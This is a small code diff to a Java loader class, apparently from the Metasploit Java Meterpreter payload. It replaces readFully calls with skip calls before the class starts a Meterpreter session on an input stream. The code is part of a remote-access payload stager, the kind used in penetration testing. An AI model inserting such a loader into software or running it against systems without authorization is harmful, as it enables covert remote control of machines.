@@ -26,11 +26,11 @@ public class URLDebugLoader {
         OutputStream out = new DataOutputStream(new ByteArrayOutputStream());
         int coreLen = in.readInt();
         while (coreLen != 0) {
-            in.readFully(new byte[coreLen]);
+            in.skip(coreLen);
             coreLen = in.readInt();
         }
         coreLen = in.readInt();
-        in.readFully(new byte[coreLen]);
+        in.skip(coreLen);
         new com.metasploit.meterpreter.Meterpreter(in, out, false, args.length == 3);
     }
 }
